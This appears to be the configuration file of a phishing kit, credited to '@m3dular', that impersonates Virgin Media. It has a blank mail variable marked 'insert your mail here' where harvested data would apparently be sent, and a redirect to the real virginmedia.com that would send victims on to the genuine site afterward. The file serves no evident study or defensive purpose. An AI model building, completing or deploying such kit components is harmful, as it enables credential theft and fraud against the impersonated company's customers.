<?php

/*
JLEWIS

created by @m3dular
    

*/
//
// insert your mail here
$to="";
// $to="test@localhost";

$redirectconfig="https://www.virginmedia.com";
?>